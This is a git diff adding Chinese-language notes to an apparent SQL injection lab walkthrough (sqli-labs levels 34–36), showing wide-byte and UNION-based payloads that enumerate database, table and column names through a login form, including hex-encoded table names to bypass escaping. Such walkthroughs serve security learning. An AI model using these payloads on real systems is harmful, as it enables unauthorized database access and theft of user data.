@@ -1115,6 +1115,119 @@ id=1' anandd 1=2 --
 
 这样的做法，已经比较熟悉了，看见表单抓包构建payload。。
 
+* 查看有没有回显，显没有进行查看闭合方式，因为如果闭合方式不对的话，是会报错的
+```
+admin%ee' union select 1,2 #
+```
+![image](https://user-images.githubusercontent.com/76896357/115108242-e8402100-9fa1-11eb-98c1-56da982232db.png)
+
+* 查库
+```
+uname=admin%ee' union select 1,database() #&passwd=admin&submit=Submit
+```
+![image](https://user-images.githubusercontent.com/76896357/115108290-32c19d80-9fa2-11eb-8bc1-0593bf408eaf.png)
+
+* 查表
+```
+uname=admin%ee' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #&passwd=admin&submit=Submit
+```
+![image](https://user-images.githubusercontent.com/76896357/115108348-92b84400-9fa2-11eb-9da0-c54c555a1149.png)
+
+* 查字段
+```
+uname=admin%ee' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #&passwd=admin&submit=Submit
+```
+![image](https://user-images.githubusercontent.com/76896357/115108418-f2165400-9fa2-11eb-8443-ed7484f40e79.png)
+
+直接报错，根据错误也知道发生了啥
+
+```
+uname=admin%ee' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #&passwd=admin&submit=Submit
+```
+![image](https://user-images.githubusercontent.com/76896357/115108450-1bcf7b00-9fa3-11eb-8cb8-9f80bf568404.png)
+
+这样就和谐了。。。
+
+过了，不说了。。。
+
+## 35. 为什么要有。。。
+
+![image](https://user-images.githubusercontent.com/76896357/115108517-7cf74e80-9fa3-11eb-848b-e11ce4ec9cc6.png)
+
+看这个报错，你会发现，啊这，他好像没有闭合方式呀！！！
+
+* 查看否是否有回显
+
+![image](https://user-images.githubusercontent.com/76896357/115108541-9e583a80-9fa3-11eb-8179-01b65c93347c.png)
+
+
+很显然，这道题还是比较简单的，过了过了。。。
+
+## 36. 
+
+* 查看有没有回显
+
+![image](https://user-images.githubusercontent.com/76896357/115108637-263e4480-9fa4-11eb-9ecb-6665ec88bb6f.png)
+
+* 查库
+
+![image](https://user-images.githubusercontent.com/76896357/115108676-5980d380-9fa4-11eb-8850-75f76c722a7c.png)
+
+* 查表
+
+![image](https://user-images.githubusercontent.com/76896357/115108722-8cc36280-9fa4-11eb-9985-bbaa4827ed7c.png)
+
+* 查字段
+
+![image](https://user-images.githubusercontent.com/76896357/115108755-c005f180-9fa4-11eb-864b-0ab5ede5fee5.png)
+
+* 查字段内容
+
+![image](https://user-images.githubusercontent.com/76896357/115108784-eaf04580-9fa4-11eb-91f2-16227934e14b.png)
+
+这道题。。。。不透。。。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
